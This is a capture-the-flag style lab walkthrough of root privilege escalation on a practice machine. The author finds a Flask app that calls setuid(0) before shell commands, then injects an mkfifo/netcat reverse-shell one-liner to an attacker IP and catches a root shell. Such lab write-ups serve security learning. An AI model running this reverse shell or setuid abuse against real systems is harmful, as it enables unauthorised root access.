* Go to /var/www/html
* See interesting file *app.py*
* Reading through this file, know that it runs the web server
```python
@app.route("/capture")
@limiter.limit("10 per minute")
def capture():

        get_lock()
        pcapid = get_appid()
        increment_appid()
        release_lock()

        path = os.path.join(app.root_path, "upload", str(pcapid) + ".pcap")
        ip = request.remote_addr
        # permissions issues with gunicorn and threads. hacky solution for now.
        #os.setuid(0)
        #command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
        command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
        os.system(command)
        #os.setuid(1000)

        return redirect("/data/" + str(pcapid))
```
* Notice the line of code near the bottom that specifies system commands then executes them
	* This code seems to set the user id of process to 0, which is root
	* This server is allowed to execute as root??
```python
if __name__ == "__main__":
        app.run("0.0.0.0", 80, debug=True)

```
* This is how the server starts up
* When trying to run it, gives an error saying port is already being used
* We don't have privelage to restart service
* Try chaning port number?
```bash
nathan@cap:/var/www/html$ python3 app.py 
 * Serving Flask app 'app' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://10.10.10.245:8080/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 974-434-802
```
* It appears to be running; visiting 10.10.10.245:8080 shows that it is running
```python
@app.route("/")
def index():
        command = f"""python3 -c 'import os; os.setuid(0); os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 9001 >/tmp/f")'"""
        os.system(command)
        return render_template("index.html")
```
* Add shellcode to script, then start a listener on our machine and visit the index of the port 8080 server
```bash
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.245] 58722
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# 
```
